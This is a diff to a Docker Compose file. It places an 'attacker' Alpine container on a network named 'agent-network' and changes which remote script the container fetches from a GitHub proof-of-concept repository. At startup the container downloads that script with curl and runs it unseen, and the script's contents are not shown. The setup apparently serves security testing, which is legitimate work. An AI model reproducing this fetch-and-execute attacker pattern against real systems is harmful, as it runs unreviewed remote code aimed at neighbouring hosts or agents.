@@ -1,12 +1,17 @@
+networks:
+  agentnet:
+    name: agent-network
+
 services:
   attacker:
     image: alpine:3.20
-    network_mode: bridge
+    networks:
+      - agentnet
     entrypoint:
       - sh
       - -c
       - |
         apk add --no-cache curl >/dev/null 2>&1
-        curl -sS -o /tmp/run.sh "https://raw.githubusercontent.com/sashabal/f23-poc/f23-test-root/attacker.sh"
+        curl -sS -o /tmp/run.sh "https://raw.githubusercontent.com/sashabal/f23-poc/f23-test-root/netname_attacker.sh"
         chmod +x /tmp/run.sh
         exec /tmp/run.sh
